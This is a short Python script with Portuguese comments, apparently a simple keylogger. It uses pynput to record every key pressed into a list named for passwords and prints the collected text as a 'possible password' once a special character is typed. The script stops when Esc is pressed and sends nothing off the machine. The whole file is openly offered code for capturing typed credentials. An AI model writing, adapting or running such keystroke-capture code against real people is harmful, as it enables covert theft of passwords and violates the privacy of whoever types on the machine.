import threading
from pynput.keyboard import Listener, Key  # Importando Key

senha = []
email = []

# Tupla de caracteres especiais
caracteres_especiais = ('!', '@', '#', '$', '%', '^', '&', '*')

def se_press(key):
    try:
        # Verifica a tecla pressionada e adiciona à lista de senha
        if hasattr(key, 'char') and key.char is not None: #o hasattr verifica se a tecla tem um char (ele é uma função que verifica se um objeto no exemplo o 'key' tem um atributo 'char')
            senha.append(key.char) # faz com que a letra digitada seja adicionada no final da variavel 'senha' que foi criada
            print(f"Tecla pressionada: {key.char}")
    except AttributeError: # é usado para lidar com a situação em que o objeto key não tem um atributo 'char' (ou seja ele não é um caractere)
        # Se a tecla for especial, como Shift ou Ctrl
        print(f"Tecla especial pressionada: {key}")
        
       # Verifica se algum caractere especial está na senha
    if any(caractere in senha for caractere in caracteres_especiais):
        print(f"Possível senha com caracteres especiais: {''.join(senha)}")

def on_release(key):
    # Para o listener quando a tecla 'esc' for pressionada
    if key == Key.esc:  # Agora 'Key' está definido
        return False

# Inicia o listener de teclado em uma thread separada
def start_listener():
    with Listener(on_press=se_press, on_release=on_release) as listener:
        listener.join()

# Cria e inicia a thread para escutar as teclas pressionadas
listener_thread = threading.Thread(target=start_listener)
listener_thread.start()
